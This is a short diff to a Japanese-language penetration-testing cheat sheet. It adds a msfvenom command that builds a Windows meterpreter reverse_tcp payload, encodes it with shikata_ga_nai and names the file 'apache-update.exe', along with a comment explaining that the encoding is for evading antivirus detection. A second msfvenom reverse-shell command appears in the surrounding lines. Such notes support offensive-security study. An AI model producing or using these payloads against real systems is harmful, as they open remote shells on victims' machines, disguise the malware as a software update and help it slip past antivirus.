@@ -580,10 +580,25 @@ reverse_shell 全部乗ってて、大変便利
 
 [CheetSheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
 
+
+
+```
+
+　msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.18 LPORT=8080 -e x86/shikata_ga_nai -f exe -o /root/apache-update.exe
+ 
+e: ペイロードを使用したところで、アンチウイルスソフトで検出される可能性も高いため、アンチウイルスの検出を回避するために、エンコードする
+   shikata_ga_nai
+
+ 
+
+ ```
+
+
 #### Windows(meterpreter)
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 ```
+
 
 #### bash
 ```
